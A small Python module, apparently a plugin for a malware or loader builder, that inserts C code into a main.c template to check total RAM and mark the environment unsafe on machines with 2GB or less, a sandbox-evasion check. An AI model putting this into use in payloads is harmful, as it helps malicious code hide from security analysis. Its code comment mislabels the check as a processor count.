def desc():
    return "Check RAM size to detect sanboxes"

def run():
    libs = '''\
#define MIN_RAM 2 // 2GB
'''

    functions = '''\
//Check for Computer Number of Processors
int checkMinRAM() {
	MEMORYSTATUSEX MemStatus = { .dwLength = sizeof(MEMORYSTATUSEX) };

	GlobalMemoryStatusEx(&MemStatus);

	return ((MemStatus.ullTotalPhys / 1073741824) <= MIN_RAM);
}
'''

    keying = '''\
	if (checkMinRAM())
		SafeEnv = FALSE;\
'''

    # Read the content of the input file
    with open("./src/main.c", 'r') as file:
        content = file.read()

    # Replace the template
    modified_content = content.replace("{{LIBS}}", libs + "\n{{LIBS}}") \
                              .replace("{{FUNCTIONS}}", functions + "\n{{FUNCTIONS}}") \
                              .replace("{{KEYING}}", keying + "\n{{KEYING}}")

    # Write the modified content to the output file
    with open("./src/main.c", 'w') as file:
        file.write(modified_content)

    return